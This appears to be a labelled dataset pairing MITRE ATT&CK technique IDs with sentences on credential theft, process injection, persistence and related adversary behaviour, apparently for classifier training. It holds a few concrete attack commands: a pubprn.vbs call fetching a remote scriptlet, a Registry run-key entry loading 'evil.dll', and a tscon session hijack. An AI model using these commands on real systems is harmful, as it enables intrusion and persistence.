T1550,GALLIUM used dumped hashes to authenticate to other machines via pass the hash.
T1550,Kimsuky has used pass the hash for authentication to remote access software used in C2.
T1550,Chimera has dumped password hashes for use in pass the hash authentication attacks.
T1550,"Adversaries may “pass the ticket” using stolen Kerberos tickets to move laterally within an environment, bypassing normal system access controls."
T1550,Pass the ticket  is a method of authenticating to a system using Kerberos tickets without having access to an account's password.
T1550,Kerberos authentication can be used as the first step to lateral movement to a remote system.
T1550,"When preforming PtT, valid Kerberos tickets for Valid Accounts are captured by OS Credential Dumping."
T1550,"A user's service tickets or ticket granting ticket  may be obtained, depending on the level of access."
T1550,"A service ticket allows for access to a particular resource, whereas a TGT can be used to request service tickets from the Ticket Granting Service  to access any resource the user has privileges to access."
T1550,A Silver Ticket can be obtained for services that use Kerberos as an authentication mechanism and are used to generate tickets to access that particular resource and the system that hosts the resource .
T1550,"A Golden Ticket can be obtained for the domain using the Key Distribution Service account KRBTGT account NTLM hash, which enables generation of TGTs for any account in Active Directory."
T1550,"Adversaries may also create a valid Kerberos ticket using other user information, such as stolen password hashes or AES keys."
T1550,"For example, ""overpassing the hash"" involves using a NTLM password hash to authenticate as a user  Pass the Hash while also using the password hash to create a valid Kerberos ticket."
T1550,Some SeaDuke samples have a module to use pass the ticket with Kerberos for authentication.
T1550,APT29 used Kerberos ticket attacks for lateral movement.
T1550,BRONZE BUTLER has created forged Kerberos Ticket Granting Ticket  and Ticket Granting Service  tickets to maintain administrative access.
T1550,APT32 successfully gained remote access by using pass the ticket.
T1110,"Adversaries may use password cracking to attempt to recover usable credentials, such as plaintext passwords, when credential material such as password hashes are obtained."
T1110,"OS Credential Dumping is used to obtain password hashes, this may only get an adversary so far when Pass the Hash is not an option."
T1110,"Techniques to systematically guess the passwords used to compute hashes are available, or the adversary may use a pre-computed rainbow table to crack hashes."
T1110,Cracking hashes is usually done on adversary-controlled systems outside of the target network.
T1110,"The resulting plaintext password resulting from a successfully cracked hash may be used to log into systems, resources, and services in which the account has access."
T1110,Net Crawler uses a list of known credentials gathered through credential dumping to guess passwords to accounts as it spreads throughout a network.
T1110,"Dragonfly 2.0 dropped and executed tools used for password cracking, including Hydra and CrackMapExec."
T1110,APT3 has been known to brute force password hashes to be able to leverage plain text credentials.
T1110,APT41 performed password brute-force attacks on the local admin account.
T1110,FIN6 has extracted password hashes from ntds.dit to crack offline.
T1556,Adversaries may register malicious password filter dynamic link libraries  into the authentication process to acquire user credentials as they are validated.
T1556,Windows password filters are password policy enforcement mechanisms for both domain and local accounts.
T1556,Filters are implemented as DLLs containing a method to validate potential passwords against password policies.
T1556,Filter DLLs can be positioned on local computers for local accounts and/or domain controllers for domain accounts.
T1556,"Before registering new passwords in the Security Accounts Manager , the Local Security Authority  requests validation from each registered filter."
T1556,Any potential changes cannot take effect until every registered filter acknowledges validation.
T1556,Adversaries can register malicious password filters to harvest credentials from local computers and/or entire domains.
T1556,"To perform proper validation, filters must receive plain-text credentials from the LSA."
T1556,A malicious password filter would receive these plain-text credentials every time a password request is made.
T1556,Remsec harvests plain-text credentials as a password filter registered on domain controllers.
T1556,"Strider has registered its persistence module on domain controllers as a Windows LSA  password filter to acquire credentials any time a domain, local user, or administrator logs in or changes a password."
T1110,Adversaries with no prior knowledge of legitimate credentials within the system or environment may guess passwords to attempt access to accounts.
T1110,"Without knowledge of the password for an account, an adversary may opt to systematically guess the password using a repetitive or iterative mechanism."
T1110,An adversary may guess login credentials without prior knowledge of system or environment passwords during an operation by using a list of common passwords.
T1110,Password guessing may or may not take into account the target's policies on password complexity or use policies that may lock accounts out after a number of failed attempts.
T1110,"Guessing passwords can be a risky option because it could cause numerous authentication failures and account lockouts, depending on the organization's login failure policies."
T1110,"Typically, management services over commonly used ports are used when guessing passwords."
T1110,"In default environments, LDAP and Kerberos connection attempts are less likely to trigger events over SMB, which creates Windows ""logon failure"" event ID 4625."
T1110,Xbash can obtain a list of weak passwords from the C2 server to use for brute forcing as well as attempt to brute force services with open ports.
T1110,Emotet has been observed using a hard coded list of passwords to brute force user accounts.
T1110,SpeakUp can perform brute forcing using a pre-defined list of usernames and passwords in an attempt to log in to administrative panels.
T1110,China Chopper's server component can perform brute force password guessing against authentication portals.
T1110,Pony has used a small dictionary of common passwords against a collected list of local accounts.
T1110,Lucifer has attempted to brute force TCP ports 135  and 1433  with the default username or list of usernames and    passwords.
T1110,"Webshell can use predefined users and passwords to execute brute force attacks against SSH, FTP, POP3, MySQL, MSSQL, and PostgreSQL services."
T1110,APT28 has used a brute-force/password-spray tooling that operated in two modes: in brute-force mode it typically sent over 300 authentication attempts per hour per targeted account over the course of several hours or days.
T1110,"APT28 has also used a Kubernetes cluster to conduct distributed, large-scale password guessing attacks."
T1555,Adversaries may acquire user credentials from third-party password managers.
T1555,"Password managers are applications designed to store user credentials, normally in an encrypted database."
T1555,Credentials are typically accessible after a user provides a master password that unlocks the database.
T1555,"After the database is unlocked, these credentials may be copied to memory."
T1555,These databases can be stored as files on disk.
T1555,Adversaries may acquire user credentials from password managers by extracting the master password and/or plain-text credentials from memory.
T1555,Adversaries may extract credentials from memory via Exploitation for Credential Access.
T1555,Adversaries may also try brute forcing via Password Guessing to obtain the master password of a password manager.
T1555,Proton gathers credentials in files for 1password.
T1555,TrickBot can steal passwords from the KeePass open source password manager.
T1555,MarkiRAT can gather information from the Keepass password manager.
T1555,Operation Wocao has accessed and collected credentials from password managers.
T1555,Fox Kitten has used scripts to access credential information from the KeePass database.
T1201,Adversaries may attempt to access detailed information about the password policy used within an enterprise network or cloud environment.
T1201,Password policies are a way to enforce complex passwords that are difficult to guess or crack through Brute Force.
T1201,This information may help the adversary to create a list of common passwords and launch dictionary and/or brute force attacks which adheres to the policy .
T1201,"Password policies can be set and discovered on Windows, Linux, and macOS systems via various command shell utilities such as net accounts , Get-ADDefaultDomainPasswordPolicy, chage -l <username>, cat /etc/pam.d/common-password, and pwpolicy getaccountpolicies  ."
T1201,Password policies can be discovered in cloud environments using available APIs such as GetAccountPasswordPolicy in AWS .
T1201,Kwampirs collects password policy information with the command net accounts.
T1201,OilRig has used net.exe in a script with net accounts /domain to find the password policy of a domain.
T1201,Turla has used net accounts and net accounts /domain to acquire password policy information.
T1201,Chimera has used the NtdsAudit utility to collect information related to accounts and passwords.
T1201,APT34 has used net.exe in a script with net accounts /domain to find the password policy of a domain.
T1110,Adversaries may use a single or small list of commonly used passwords against many different accounts to attempt to acquire valid account credentials.
T1110,"Password spraying uses one password , or a small list of commonly used passwords, that may match the complexity policy of the domain."
T1110,Logins are attempted with that password against many different accounts on a network to avoid account lockouts that would normally occur when brute forcing a single account with many passwords.
T1110,"Typically, management services over commonly used ports are used when password spraying."
T1110,Linux Rabbit brute forces SSH passwords in order to attempt to gain access and install its malware onto the server.

T1110,"Lazarus Group malware attempts to connect to Windows shares for lateral movement by using a generated list of usernames, which center around permutations of the username Administrator, and weak passwords."
T1110,APT33 has used password spraying to gain access to target systems.
T1110,APT28 has used a brute-force/password-spray tooling that operated in two modes: in password-spraying mode it conducted approximately four authentication attempts per hour per targeted account over the course of several days or weeks.
T1110,"APT28 has also used a Kubernetes cluster to conduct distributed, large-scale password spray attacks."
T1110,Chimera has used multiple password spraying attacks against victim's remote services to obtain valid user and administrator accounts.
T1110,Silent Librarian has used collected lists of names and e-mail accounts to use in password spraying attacks against private sector targets.
T1110,APT29 has conducted brute force password spray attacks.
T1110,Sandworm Team has used a script to attempt RPC authentication against a number of hosts.
T1601,Adversaries may modify the operating system of a network device to introduce new capabilities or weaken existing defenses.
T1601,"Some network devices are built with a monolithic architecture, where the entire operating system and most of the functionality of the device is contained within a single file."
T1601,"Adversaries may change this file in storage, to be loaded in a future boot, or in memory during runtime."
T1601,"To change the operating system in storage, the adversary will typically use the standard procedures available to device operators."
T1601,"This may involve downloading a new file via typical protocols used on network devices, such as TFTP, FTP, SCP, or a console connection."
T1601,"The original file may be overwritten, or a new file may be written alongside of it and the device reconfigured to boot to the compromised image."
T1601,"To change the operating system in memory, the adversary typically can use one of two methods."
T1601,"In the first, the adversary would make use of native debug commands in the original, unaltered running operating system that allow them to directly modify the relevant memory addresses containing the running operating system."
T1601,This method typically requires administrative level access to the device.
T1601,"In the second method for changing the operating system in memory, the adversary would make use of the boot loader."
T1601,"The boot loader is the first piece of software that loads when the device starts that, in turn, will launch the operating system."
T1601,"Adversaries may use malicious code previously implanted in the boot loader, such as through the ROMMONkit method, to directly manipulate running operating system code in memory."
T1601,"This malicious code in the bootloader provides the capability of direct memory manipulation to the adversary, allowing them to patch the live operating system during runtime."
T1601,"By modifying the instructions stored in the system image file, adversaries may either weaken existing defenses or provision new capabilities that the device did not have before."
T1601,"Examples of existing defenses that can be impeded include encryption, via Weaken Encryption, authentication, via Network Device Authentication, and perimeter defenses, via Network Boundary Bridging."
T1601,"Adding new capabilities for the adversary’s purpose include Keylogging, Multi-hop Proxy, and Port Knocking."
T1601,Adversaries may also compromise existing commands in the operating system to produce false output to mislead defenders.
T1601,"When this method is used in conjunction with Downgrade System Image, one example of a compromised system command may include changing the output of the command that shows the version of the currently running operating system."
T1601,"By patching the operating system, the adversary can change this command to instead display the original, higher revision number that they replaced through the system downgrade."
T1601,"When the operating system is patched in storage, this can be achieved in either the resident storage  or via TFTP Boot."
T1601,"When the technique is performed on the running operating system in memory and not on the stored copy, this technique will not survive across reboots."
T1601,"However, live memory modification of the operating system can be combined with ROMMONkit to achieve persistence."
T1601,SYNful Knock is malware that is inserted into a network device by patching the operating system image.
T1574,Adversaries may execute their own malicious payloads by hijacking environment variables used to load libraries.
T1574,"Adversaries may place a program in an earlier entry in the list of directories stored in the PATH environment variable, which Windows will then execute when it searches sequentially through that PATH listing in search of the binary that was called from a script or the command line."
T1574,The PATH environment variable contains a list of directories.
T1574,Certain methods of executing a program  rely solely on the PATH environment variable to determine the locations that are searched for a program when the path for the program is not given.
T1574,"If any directories are listed in the PATH environment variable before the Windows directory, %SystemRoot%\system32 , a program may be placed in the preceding directory that is named the same as a Windows program , which will be executed when that command is executed from a script or command-line."
T1574,"For example, if C:\example path precedes C:\Windows\system32 is in the PATH environment variable, a program that is named net.exe and placed in C:\example path will be called instead of the Windows system ""net"" when ""net"" is executed from the command-line."
T1574,Adversaries may execute their own malicious payloads by hijacking the search order used to load other programs.
T1574,"Because some programs do not call other programs using the full path, adversaries may place their own file in the directory where the calling program is located, causing the operating system to launch their malicious software at the request of the calling program."
T1574,Search order hijacking occurs when an adversary abuses the order in which Windows searches for programs that are not given a path.
T1574,"Unlike DLL Search Order Hijacking, the search order differs depending on the method that is used to execute the program."
T1574,"However, it is common for Windows to search in the directory of the initiating program before searching through the Windows system directory."
T1574,"An adversary who finds a program vulnerable to search order hijacking , a program that does not specify the path to an executable may take advantage of this vulnerability by creating a program named after the improperly specified program and placing it within the initiating program's directory."
T1574,"For example, ""example.exe"" runs ""cmd.exe"" with the command-line argument net user."
T1574,"An adversary may place a program called ""net.exe"" within the same directory as example.exe, ""net.exe"" will be run instead of the Windows system utility net."
T1574,"In addition, if an adversary places a program called ""net.com"" in the same directory as ""net.exe"", then cmd.exe /C net user will execute ""net.com"" instead of ""net.exe"" due to the order of executable extensions defined under PATHEXT."
T1574,Search order hijacking is also a common practice for hijacking DLL loads and is covered in DLL Search Order Hijacking.
T1574,Adversaries may execute their own malicious payloads by hijacking vulnerable file path references.
T1574,"Adversaries can take advantage of paths that lack surrounding quotations by placing an executable in a higher level directory within the path, so that Windows will choose the adversary's executable to launch."
T1574,Service paths  and shortcut paths may also be vulnerable to path interception if the path has one or more spaces and is not surrounded by quotation marks .
T1574,"An adversary can place an executable in a higher level directory of the path, and Windows will resolve that executable instead of the intended executable."
T1574,"For example, if the path in a shortcut is C:\program files\myapp.exe, an adversary may create a program at C:\program.exe that will be run instead of the intended program."
T1574,"This technique can be used for persistence if executables are called on a regular basis, as well as privilege escalation if intercepted executables are started by a higher privileged process."
T1120,Adversaries may attempt to gather information about attached peripheral devices and components connected to a computer system.
T1120,"Peripheral devices could include auxiliary resources that support a variety of functionalities such as keyboards, printers, cameras, smart card readers, or removable storage."

T1556,Adversaries may modify pluggable authentication modules  to access user credentials or enable otherwise unwarranted access to accounts.
T1556,"PAM is a modular system of configuration files, libraries, and executable files which guide authentication for many services."
T1556,"The most common authentication module is pam_unix.so, which retrieves, sets, and verifies account authentication information in /etc/passwd and /etc/shadow."
T1556,Adversaries may modify components of the PAM system to create backdoors.
T1556,"PAM components, such as pam_unix.so, can be patched to accept arbitrary adversary supplied values as legitimate credentials."
T1556,Malicious modifications to the PAM system may also be abused to steal credentials.
T1556,"Adversaries may infect PAM resources with code to harvest user credentials, since the values exchanged with PAM components may be plain-text since PAM does not store passwords."
T1556,Skidmap has the ability to replace the pam_unix.so file on an infected machine with its own malicious version that accepts a specific backdoor password for all users.
T1556,Ebury can deactivate PAM modules to tamper with the sshd configuration.
T1205,Adversaries may use port knocking to hide open ports used for persistence or command and control.
T1205,"To enable a port, an adversary sends a series of attempted connections to a predefined sequence of closed ports."
T1205,"After the sequence is completed, opening a port is often accomplished by the host based firewall, but could also be implemented by custom software."
T1205,This technique has been observed to both for the dynamic opening of a listening port as well as the initiating of a connection to a listening server on a different system.
T1205,The observation of the signal packets to trigger the communication can be conducted through different methods.
T1205,"One means, originally implemented by Cd00r , is to use the libpcap libraries to sniff for the packets in question."
T1205,"Another method leverages raw sockets, which enables the malware to use ports that are already open for use by other programs."
T1205,PROMETHIUM has used a script that configures the knockd service and firewall to only accept C2 connections from systems that use a specified sequence of knock ports.
T1547,Adversaries may use port monitors to run an attacker supplied DLL during system boot for persistence or privilege escalation.
T1547,A port monitor can be set through the AddMonitor API call to set a DLL to be loaded at startup.
T1547,"This DLL can be located in C:\Windows\System32 and will be loaded by the print spooler service, spoolsv.exe, on boot."
T1547,The spoolsv.exe process also runs under SYSTEM level permissions.
T1547,"Alternatively, an arbitrary DLL can be loaded if permissions allow writing a fully-qualified pathname for that DLL to HKLM\SYSTEM\CurrentControlSet\Control\Print\Monitors."
T1547,"The Registry key contains entries for the following:
* Local Port
* Standard TCP/IP Port
* USB Monitor
* WSD Port
Adversaries can use this technique to load malicious code at startup that will persist on system reboot and execute as SYSTEM."
T1055,Adversaries may inject portable executables  into processes in order to evade process-based defenses as well as possibly elevate privileges.
T1055,PE injection is a method of executing arbitrary code in the address space of a separate live process.
T1055,PE injection is commonly performed by copying code  into the virtual address space of the target process before invoking it via a new thread.
T1055,"The write can be performed with native Windows API calls such as VirtualAllocEx and WriteProcessMemory, then invoked with CreateRemoteThread or additional code ."
T1055,The displacement of the injected code does introduce the additional requirement for functionality to remap memory references.

T1546,Adversaries may gain persistence and elevate privileges by executing malicious content triggered by PowerShell profiles.
T1546,A PowerShell profile   is a script that runs when PowerShell starts and can be used as a logon script to customize user environments.
T1546,PowerShell supports several profiles depending on the user or host program.
T1546,"For example, there can be different profiles for PowerShell host programs such as the PowerShell console, PowerShell ISE or Visual Studio Code."
T1546,An administrator can also configure a profile that applies to all users and host programs on the local computer.
T1546,"Adversaries may modify these profiles to include arbitrary commands, functions, modules, and/or PowerShell drives to gain persistence."
T1546,Every time a user opens a PowerShell session the modified script will be executed unless the -NoProfile flag is used when it is launched.
T1546,"An adversary may also be able to escalate privileges if a script in a PowerShell profile is loaded and executed by an account with higher privileges, such as a domain administrator."
T1546,Turla has used PowerShell profiles to maintain persistence on an infected machine.
T1542,Adversaries may abuse Pre-OS Boot mechanisms as a way to establish persistence on a system.
T1542,"During the booting process of a computer, firmware and various startup services are loaded before the operating system."
T1542,These programs control flow of execution before the operating system takes control.
T1542,Adversaries may overwrite data in boot drivers or firmware such as BIOS  and The Unified Extensible Firmware Interface  to persist on systems at a layer below the operating system.
T1542,This can be particularly difficult to detect as malware at this level will not be detected by host software-based defenses.
T1547,Adversaries may abuse print processors to run malicious DLLs during system boot for persistence and/or privilege escalation.
T1547,"Print processors are DLLs that are loaded by the print spooler service, spoolsv.exe, during boot."
T1547,Adversaries may abuse the print spooler service by adding print processors that load malicious DLLs at startup.
T1547,A print processor can be installed through the AddPrintProcessor API call with an account that has SeLoadDriverPrivilege enabled.
T1547,"Alternatively, a print processor can be registered to the print spooler service by adding the HKLM\SYSTEM\\CurrentControlSet or ControlSet001\Control\Print\Environments\\Windows architecture: e.g., Windows x64\Print Processors\\user defined\Driver Registry key that points to the DLL."
T1547,"For the print processor to be correctly installed, it must be located in the system print-processor directory that can be found with the GetPrintProcessorDirectory API call."
T1547,"After the print processors are installed, the print spooler service, which starts during boot, must be restarted in order for them to run."
T1547,"The print spooler service runs under SYSTEM level permissions, therefore print processors installed by an adversary may run under elevated privileges."
T1547,The PipeMon installer has modified the Registry key HKLM\SYSTEM\CurrentControlSet\Control\Print\Environments\Windows x64\Print Processors to install PipeMon as a Print Processor.
T1552,Adversaries may search for private key certificate files on compromised systems for insecurely stored credentials.
T1552,"Private cryptographic keys and certificates are used for authentication, encryption/decryption, and digital signatures."
T1552,"Common key and certificate file extensions include: .key, .pgp, .gpg, .ppk., .p12, .pem, .pfx, .cer, .p7b, .asc."
T1552,"Adversaries may also look in common key directories, such as ~/.ssh for SSH keys on * nix-based systems or C:&#92;Users&#92;&#92;.ssh&#92; on Windows."
T1552,These private keys can be used to authenticate to Remote Services like SSH or for use in decrypting other collected files such as email.
T1552,Adversary tools have been discovered that search compromised systems for file extensions relating to cryptographic keys and certificates.
T1552,"Some private keys require a password or passphrase for operation, so an adversary may also use Input Capture for keylogging or attempt to Brute Force the passphrase off-line."
T1552,Ebury has intercepted unencrypted private keys as well as private key pass-phrases.

T1552,TeamTNT has searched for unsecured SSH keys.
T1003,Adversaries may gather credentials from information stored in the Proc filesystem or /proc.
T1003,The Proc filesystem on Linux contains a great deal of information regarding the state of the running operating system.
T1003,Processes running with root privileges can use this facility to scrape live memory of other running programs.
T1003,"If any of these programs store passwords in clear text or password hashes in memory, these values can then be harvested for either usage or brute force attacks, respectively."
T1003,"This functionality has been implemented in the MimiPenguin, an open source tool inspired by Mimikatz."
T1003,"The tool dumps process memory, then harvests passwords and hashes by looking for text strings and regex patterns for how given applications such as Gnome Keyring, sshd, and Apache use memory to store such authentication artifacts."
T1055,Adversaries may inject malicious code into processes via the /proc filesystem in order to evade process-based defenses as well as possibly elevate privileges.
T1055,Proc memory injection is a method of executing arbitrary code in the address space of a separate live process.
T1055,Proc memory injection involves enumerating the memory of a process via the /proc filesystem  then crafting a return-oriented programming  payload with available gadgets/instructions.
T1055,"Each running process has its own directory, which includes memory mappings."
T1055,Proc memory injection is commonly performed by overwriting the target processes’ stack using memory mappings provided by the /proc filesystem.
T1055,This information can be used to enumerate offsets  and gadgets  otherwise hidden by process memory protections such as address space layout randomization .
T1055,"Once enumerated, the target processes’ memory map within /proc/pid/maps can be overwritten using dd."
T1055,Other techniques such as Dynamic Linker Hijacking may be used to populate a target process with more available gadgets.
T1055,"Similar to Process Hollowing, proc memory injection may target child processes ."
T1055,Execution via proc memory injection may also evade detection from security products since the execution is masked under a legitimate process.
T1057,Adversaries may attempt to get information about running processes on a system.
T1057,Information obtained could be used to gain an understanding of common software/applications running on systems within the network.
T1057,"Adversaries may use the information from Process Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions."
T1057,"In Windows environments, adversaries could obtain details on running processes using the Tasklist utility via cmd or Get-Process via PowerShell."
T1057,Information about processes can also be extracted from the output of Native API calls such as CreateToolhelp32Snapshot.
T1057,"In Mac and Linux, this is accomplished with the ps command."
T1057,Adversaries may also opt to enumerate processes via /proc.
T1057,JPIN can list running processes.

T1055,Process doppelgänging is a method of executing arbitrary code in the address space of a separate live process.
T1055,Windows Transactional NTFS  was introduced in Vista as a method to perform safe file operations.
T1055,"To ensure data integrity, TxF enables only one transacted handle to write to a file at a given time."

T1055,"To avoid corruption, TxF performs an automatic rollback if the system or application fails during a write transaction."
T1055,"Although deprecated, the TxF application programming interface  is still enabled as of Windows 10."
T1055,Adversaries may abuse TxF to a perform a file-less variation of Process Injection.

T1055,"Process doppelgänging's use of TxF also avoids the use of highly-monitored API functions such as NtUnmapViewOfSection, VirtualProtectEx, and SetThreadContext."
T1055,"Process Doppelgänging is implemented in 4 steps :
* Transact – Create a TxF transaction using a legitimate executable then overwrite the file with malicious code."
T1055,These changes will be isolated and only visible within the context of the transaction.
T1055,* Load – Create a shared section of memory and load the malicious executable.
T1055,"* Rollback – Undo changes to original executable, effectively removing malicious code from the file system."
T1055,* Animate – Create a process from the tainted section of memory and initiate execution.
T1055,This behavior will likely not result in elevated privileges since the injected process was spawned from  of the injecting process.

T1055,Adversaries may inject malicious code into processes via ptrace  system calls in order to evade process-based defenses as well as possibly elevate privileges.
T1055,Ptrace system call injection is a method of executing arbitrary code in the address space of a separate live process.
T1055,Ptrace system call injection involves attaching to and modifying a running process.
T1055,"The ptrace system call enables a debugging process to observe and control another process , including changing memory and register values."

T1216,Adversaries may use PubPrn to proxy execution of malicious remote files.
T1216,PubPrn.vbs is a Visual Basic script that publishes a printer to Active Directory Domain Services.
T1216,The script is signed by Microsoft and is commonly executed through the Windows Command Shell via Cscript.exe.
T1216,"For example, the following code publishes a printer within the specified domain: cscript pubprn Printer1 LDAP://CN=Container1,DC=Domain1,DC=Com."
T1216,Adversaries may abuse PubPrn to execute malicious payloads hosted on remote sites.

T1216,An example command is pubprn.vbs 127.0.0.1 script:https://mydomain.com/folder/file.sct.
T1216,This behavior may bypass signature validation restrictions and application control solutions that do not account for abuse of this script.
T1216,"In later versions of Windows , PubPrn.vbs has been updated to prevent proxying execution from a remote site."
T1216,"This is done by limiting the protocol specified in the second parameter to LDAP://, vice the script: moniker which could be used to reference remote code via HTTP."

T1037,Adversaries may establish persistence by modifying RC scripts which are executed during a Unix-like system’s startup.
T1037,These files allow system administrators to map and start custom services at startup for different run levels.
T1037,RC scripts require root privileges to modify.
T1037,"Adversaries can establish persistence by adding a malicious binary path or shell commands to rc.local, rc.common, and other RC scripts specific to the Unix-like distribution."
T1037,"Upon reboot, the system executes the script's contents as root, resulting in persistence."
T1037,"Adversary abuse of RC scripts is especially effective for lightweight Unix-like distributions using the root user as default, such as IoT or embedded systems."
T1037,Several Unix-like systems have moved to Systemd and deprecated the use of RC scripts.
T1037,This is now a deprecated mechanism in macOS in favor of Launchd.
T1037,This technique can be used on Mac OS X Panther v10.3 and earlier versions which still execute the RC scripts.

T1037,iKitten adds an entry to the rc.common file for persistence.
T1037,HiddenWasp installs reboot persistence by adding itself to /etc/rc.local.
T1563,Adversaries may hijack a legitimate user’s remote desktop session to move laterally within an environment.
T1563,Remote desktop is a common feature in operating systems.
T1563,It allows a user to log into an interactive session with a system desktop graphical user interface on a remote system.
T1563,Microsoft refers to its implementation of the Remote Desktop Protocol  as Remote Desktop Services .
T1563,Adversaries may perform RDP session hijacking which involves stealing a legitimate user's remote session.
T1563,"Typically, a user is notified when someone else is trying to steal their session."
T1563,"With System permissions and using Terminal Services Console, `c:\windows\system32\tscon.exe session number to be stolen`, an adversary can hijack a session without the need for credentials or prompts to the user."
T1563,This can be done remotely or locally and with active or disconnected sessions.
T1563,It can also lead to Remote System Discovery and Privilege Escalation by stealing a Domain Admin or higher privileged account session.
T1563,"All of this can be done by using native Windows commands, but it has also been added as a feature in red teaming tools."
T1563,WannaCry enumerates current remote desktop sessions and tries to execute the malware on each session.
T1542,Adversaries may abuse the ROM Monitor  by loading an unauthorized firmware with adversary code to provide persistent access and manipulate device behavior that is difficult to detect.
T1542,"ROMMON is a Cisco network device firmware that functions as a boot loader, boot image, or boot helper to initialize hardware and software when the platform is powered on or reset."
T1542,"Similar to TFTP Boot, an adversary may upgrade the ROMMON image locally or remotely  with adversary code and restart the device in order to overwrite the existing ROMMON image."
T1542,This provides adversaries with the means to update the ROMMON to gain persistence on a system in a way that may be difficult to detect.
T1547,Adversaries may modify plist files to automatically run an application when a user logs in.
T1547,"Starting in Mac OS X 10.7 , users can specify certain applications to be re-opened when a user logs into their machine after reboot."
T1547,"While this is usually done via a Graphical User Interface  on an app-by-app basis, there are property list files  that contain this information as well located at ~/Library/Preferences/com.apple.loginwindow.plist and ~/Library/Preferences/ByHost/com.apple.loginwindow."
T1547,* .plist.
T1547,An adversary can modify one of these files directly to include a link to their malicious executable to provide a persistence mechanism each time the user reboots their machine .
T1600,Adversaries may reduce the level of effort required to decrypt data transmitted over the network by reducing the cipher strength of encrypted communications.
T1600,Adversaries can weaken the encryption software on a compromised network device by reducing the key size used by the software to convert plaintext to ciphertext .
T1600,"As a result, adversaries dramatically reduce the amount of effort needed to decrypt the protected information without the key."
T1600,Adversaries may modify the key size used and other encryption parameters using specialized commands in a Network Device CLI introduced to the system through Modify System Image to change the configuration of the device.
T1498,Adversaries may attempt to cause a denial of service by reflecting a high-volume of network traffic to a target.
T1498,This type of Network DoS takes advantage of a third-party server intermediary that hosts and will respond to a given spoofed source IP address.
T1498,This third-party server is commonly termed a reflector.
T1498,An adversary accomplishes a reflection attack by sending packets to reflectors with the spoofed address of the victim.
T1498,"Similar to Direct Network Floods, more than one system may be used to conduct the attack, or a botnet may be used."
T1498,"Likewise, one or more reflector may be used to focus traffic on the target."
T1498,"Reflection attacks often take advantage of protocols with larger responses than requests in order to amplify their traffic, commonly known as a Reflection Amplification attack."
T1498,Adversaries may be able to generate an increase in volume of attack traffic that is several orders of magnitude greater than the requests sent to the amplifiers.
T1498,"The extent of this increase will depending upon many variables, such as the protocol in question, the technique used, and the amplifying servers that actually produce the amplification in attack volume."
T1498,"Two prominent protocols that have enabled Reflection Amplification Floods are DNS and NTP, though the use of several others in the wild have been documented."
T1498,"In particular, the memcache protocol showed itself to be a powerful protocol, with amplification sizes up to 51,200 times the requesting packet."
T1620,Adversaries may reflectively load code into a process in order to conceal the execution of malicious payloads.
T1620,"Reflective loading involves allocating then executing payloads directly within the memory of the process, vice creating a thread or process backed by a file path on disk."
T1620,"Reflectively loaded payloads may be compiled binaries, anonymous files , or just snubs of fileless executable code ."
T1620,Reflective code injection is very similar to Process Injection except that the “injection” loads code into the processes’ own memory instead of that of a separate process.
T1620,Reflective loading may evade process-based detections since the execution of the arbitrary code may be masked within a legitimate or otherwise benign process.
T1620,"Reflectively loading payloads directly into memory may also avoid creating files or other artifacts on disk, while also enabling malware to keep these payloads encrypted  until execution."
T1620,Lokibot has reflectively loaded the decoded DLL into memory.
T1620,Cobalt Strike's execute-assembly command can run a .NET executable within the memory of a sacrificial process by loading the CLR.
T1620,ThiefQuest uses various API functions such as NSCreateObjectFileImageFromMemory to load and link in-memory payloads.
T1620,Cuba loaded the payload into memory using PowerShell.
T1547,Adversaries may achieve persistence by adding a program to a startup folder or referencing it with a Registry run key.
T1547,"Adding an entry to the ""run keys"" in the Registry or startup folder will cause the program referenced to be executed when a user logs in."
T1547,Placing a program within a startup folder will also cause that program to execute when a user logs in.
T1547,There is a startup folder location for individual user accounts as well as a system-wide startup folder that will be checked regardless of which user account logs in.
T1547,The startup folder path for the current user is C:\Users\\Username\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup.
T1547,The startup folder path for all users is C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp.
T1547,"The following run keys are created by default on Windows systems:
* HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run
* HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce
* HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run
* HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce
Run keys may exist under multiple hives."
T1547,The HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnceEx is also available but is not created by default on Windows Vista and newer.
T1547,Registry run key entries can reference programs directly or list them as a dependency.
T1547,"For example, it is possible to load a DLL at logon using a ""Depend"" key with RunOnceEx: reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx\0001\Depend /v 1 /d ""C:\temp\evil.dll"" 
The following Registry keys can be used to set startup folder items for persistence:
* HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders
* HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders
* HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders
* HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders
The following Registry keys can control automatic startup of services during boot:
* HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce
* HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce
* HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServices
* HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServices
Using policy settings to specify startup programs creates corresponding values in either of two Registry keys:
* HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run
* HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run
The Winlogon key controls actions that occur when a user logs on to a computer running Windows 7."
T1547,"Most of these actions are under the control of the operating system, but you can also add custom actions here."
T1547,The HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Userinit and HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Shell subkeys can automatically launch programs.

T1036,Adversaries may abuse the right-to-left override  character  to disguise a string and/or file name to make it appear benign.
T1036,RTLO is a non-printing Unicode character that causes the text that follows it to be displayed in reverse.
T1036,"For example, a Windows screensaver executable named March 25 \u202Excod.scr will display as March 25 rcs.docx."
